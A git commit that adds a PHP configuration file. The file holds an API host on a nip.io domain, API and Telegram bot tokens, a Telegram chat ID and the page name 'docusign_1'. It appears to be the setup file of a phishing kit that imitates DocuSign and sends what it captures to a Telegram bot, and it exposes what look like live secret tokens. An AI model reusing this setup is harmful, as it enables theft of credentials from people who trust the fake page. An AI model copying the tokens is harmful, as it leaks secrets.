e0b001e8094e767fcb2f4da768631afa3f1cab10
appreview-s <rwllms@procurementresource.net>
2026-09-20 20:06:25 -0700

    Add files via upload

---
+++ config.php
@@ -0,0 +1,12 @@
+<?php
+
+$api_host = "f6c26368b98b25020f.90ac645f.nip.io";
+$api_token = "7f555743b8a01060182f8e7d5fe2ff";
+$api_prefix = "irln8432";
+
+$telegram_bot_token = "8909358885:AAGdz7p7DWHjvVm-_7rPt8PiIKxIffqqCjY";
+$telegram_chat_id = "7770956482";
+
+$page_name = "docusign_1";
+
+?>
